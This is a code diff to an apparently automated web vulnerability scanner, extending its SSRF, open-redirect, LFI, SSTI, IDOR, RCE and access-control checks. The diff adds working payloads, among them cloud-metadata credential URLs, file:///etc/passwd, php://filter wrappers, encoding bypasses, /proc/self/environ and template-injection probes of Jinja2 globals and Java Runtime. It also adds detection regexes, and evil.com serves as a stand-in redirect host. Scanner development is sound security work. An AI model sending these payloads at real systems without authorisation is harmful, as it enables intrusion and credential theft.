@@ -69,21 +69,31 @@ async def _send(
 # ---------------------------------------------------------------------------
 
 _SSRF_PAYLOADS = [
-    "http://169.254.169.254/latest/meta-data/",
-    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    # Internal network / localhost
     "http://127.0.0.1",
+    "http://localhost",
+    "http://127.0.0.1:22",
+    "http://127.0.0.1:3306",
+    "http://127.0.0.1:6379",
+    "http://127.0.0.1:8080",
     "http://[::1]",
     "http://0x7f000001",
     "http://2130706433",
     "http://0177.0.0.1",
-    "http://localhost",
+    # File protocol
+    "file:///etc/passwd",
+    "file:///etc/hostname",
+    # Cloud metadata
+    "http://169.254.169.254/latest/meta-data/",
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "http://169.254.169.254/computeMetadata/v1/",
     "http://169.254.169.254/metadata/instance",
 ]
 
 _SSRF_INDICATORS = re.compile(
     r"ami-id|instance-id|iam|security-credentials|computeMetadata|"
-    r"availabilityZone|privateIp|accountId|instanceType",
+    r"availabilityZone|privateIp|accountId|instanceType|"
+    r"root:x:0:0|/bin/bash|SSH-2\.0|REDIS|ERR wrong number of arguments",
     re.I,
 )
 
@@ -104,8 +114,8 @@ async def test_ssrf(
             if status == 0:
                 continue
 
-            # Check for cloud metadata indicators in response
-            if _SSRF_INDICATORS.search(body):
+            # Check for indicators in response that weren't in baseline
+            if _SSRF_INDICATORS.search(body) and not _SSRF_INDICATORS.search(baseline_body):
                 ssrf_type = "full_ssrf" if "security-credentials" in body else "partial"
                 return {
                     "vulnerable": True,
@@ -117,7 +127,10 @@ async def test_ssrf(
                 }
 
             # Significant response change could indicate blind SSRF
-            if abs(len(body) - baseline_len) > 500 and status != baseline_status:
+            # Use OR: either big size change or different status code
+            size_diff = abs(len(body) - baseline_len) > 500
+            status_diff = status != baseline_status and status not in (0, 400, 404)
+            if size_diff or (status_diff and abs(len(body) - baseline_len) > 100):
                 return {
                     "vulnerable": True,
                     "payload": payload,
@@ -183,6 +196,36 @@ async def test_open_redirect(
                     "url": test_url,
                 }
 
+            # Check body for JS/meta-based redirects
+            if "evil.com" in body:
+                # Look for window.location, meta refresh, etc.
+                js_redirect = re.search(
+                    r'(window\.location|location\.href|location\.replace|'
+                    r'meta\s+http-equiv=["\']refresh["\'])[^>]*evil\.com',
+                    body, re.I,
+                )
+                if js_redirect:
+                    return {
+                        "vulnerable": True,
+                        "payload": payload,
+                        "redirected_to": "evil.com (body-based)",
+                        "type": "js_redirect",
+                        "evidence": body[:500],
+                        "param": param,
+                        "url": test_url,
+                    }
+                # Even if not via JS, reflection of evil.com in body is noteworthy
+                if status == 200:
+                    return {
+                        "vulnerable": True,
+                        "payload": payload,
+                        "redirected_to": "evil.com (reflected in body)",
+                        "type": "reflected_redirect",
+                        "evidence": body[:500],
+                        "param": param,
+                        "url": test_url,
+                    }
+
     return {"vulnerable": False, "param": param, "url": target_url, "type": None}
 
 
@@ -198,6 +241,17 @@ _LFI_PAYLOADS_LINUX = [
     "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
     "/etc/passwd%00",
     "/etc/passwd%00.jpg",
+    # PHP wrapper payloads
+    "php://filter/convert.base64-encode/resource=/etc/passwd",
+    "php://filter/convert.base64-encode/resource=index",
+    "php://filter/read=string.rot13/resource=/etc/passwd",
+    # Null byte bypass
+    "....//....//....//etc/passwd%00",
+    # Double encoding
+    "..%252f..%252f..%252f..%252fetc/passwd",
+    # proc self for Python/Node apps
+    "/proc/self/environ",
+    "/proc/self/cmdline",
 ]
 
 _LFI_PAYLOADS_WINDOWS = [
@@ -206,7 +260,10 @@ _LFI_PAYLOADS_WINDOWS = [
     "..\\..\\..\\..\\..\\Windows\\win.ini",
 ]
 
-_LFI_LINUX_INDICATORS = re.compile(r"root:x:0:0|/bin/bash|/bin/sh|daemon:x:")
+# Base64-encoded /etc/passwd starts with "cm9vd" (base64 of "root:")
+_LFI_LINUX_INDICATORS = re.compile(
+    r"root:x:0:0|/bin/bash|/bin/sh|daemon:x:|cm9vdD|USER=|HOME=|PATH=|HOSTNAME=",
+)
 _LFI_WINDOWS_INDICATORS = re.compile(r"\[extensions\]|\[fonts\]|for 16-bit app support")
 
 
@@ -297,12 +354,17 @@ async def test_crlf(
 # ---------------------------------------------------------------------------
 
 _SSTI_PAYLOADS = [
-    ("{{7*7}}", "49", "jinja2"),
-    ("${7*7}", "49", "freemarker"),
-    ("#{7*7}", "49", "ruby_erb"),
-    ("<%= 7*7 %>", "49", "erb"),
+    # Use unique products that won't appear in normal HTML
+    ("{{1337*7331}}", "9799447", "jinja2"),
+    ("${1337*7331}", "9799447", "freemarker"),
+    ("#{1337*7331}", "9799447", "ruby_erb"),
+    ("<%= 1337*7331 %>", "9799447", "erb"),
+    ("{{7*'7'}}", "7777777", "jinja2"),
+    # Classic payloads as fallback
     ("{{config}}", "SECRET_KEY", "jinja2"),
-    ("{{self.__class__}}", "class", "jinja2"),
+    ("{{config.__class__.__init__.__globals__}}", "os.path", "jinja2"),
+    ("${T(java.lang.Runtime)}", "java.lang.Runtime", "spring_el"),
+    ("#{T(java.lang.Runtime)}", "java.lang.Runtime", "spring_el"),
 ]
 
 
@@ -462,7 +524,7 @@ async def test_idor(
             body_hash = hashlib.md5(body.encode()).hexdigest()
 
             # Different value returns 200 with different content
-            if status == 200 and body_hash != baseline_hash and len(body) > 100:
+            if status == 200 and body_hash != baseline_hash and len(body) > 10:
                 confidence = "medium" if original_value.isdigit() else "low"
                 return {
                     "potential_idor": True,
@@ -862,6 +924,7 @@ async def test_rce(
                     return result
 
             # Output-based Linux payloads
+            baseline_has_linux = _RCE_OUTPUT_INDICATORS.search(baseline_body)
             for payload in _RCE_OUTPUT_PAYLOADS:
                 test_url = _replace_param(target_url, param, original_value + payload)
                 status, body, _ = await _send(session, test_url)
@@ -869,7 +932,8 @@ async def test_rce(
                 if status == 0:
                     continue
 
-                if _RCE_OUTPUT_INDICATORS.search(body):
+                match = _RCE_OUTPUT_INDICATORS.search(body)
+                if match and not baseline_has_linux:
                     result.update({
                         "vulnerable": True,
                         "technique": "output-based",
@@ -881,6 +945,7 @@ async def test_rce(
                     return result
 
             # Output-based Windows payloads
+            baseline_has_win = _RCE_WINDOWS_INDICATORS.search(baseline_body)
             for payload in _RCE_OUTPUT_PAYLOADS_WINDOWS:
                 test_url = _replace_param(target_url, param, original_value + payload)
                 status, body, _ = await _send(session, test_url)
@@ -888,7 +953,7 @@ async def test_rce(
                 if status == 0:
                     continue
 
-                if _RCE_WINDOWS_INDICATORS.search(body):
+                if _RCE_WINDOWS_INDICATORS.search(body) and not baseline_has_win:
                     result.update({
                         "vulnerable": True,
                         "technique": "output-based",
@@ -946,6 +1011,15 @@ async def test_broken_access(
 
     try:
         async with aiohttp.ClientSession() as session:
+            # Get baseline response size (homepage) to detect SPA catch-all
+            baseline_size = 0
+            try:
+                base_url = endpoints[0].split("/")[0] + "//" + endpoints[0].split("/")[2]
+                _, base_body, _ = await _send(session, base_url)
+                baseline_size = len(base_body)
+            except Exception:
+                pass
+
             # Strategy 1: Unauthenticated admin access
             admin_endpoints = [
                 ep for ep in endpoints
@@ -954,6 +1028,10 @@ async def test_broken_access(
 
             for endpoint in admin_endpoints:
                 status, body, _ = await _send(session, endpoint)
+                # Skip if response matches SPA catch-all (same size as homepage)
+                if baseline_size and abs(len(body) - baseline_size) < 50:
+                    continue
+                # Must be 200 with meaningful content, and look like data (JSON/HTML with data)
                 if status == 200 and len(body) > 100:
                     findings.append({
                         "endpoint": endpoint,
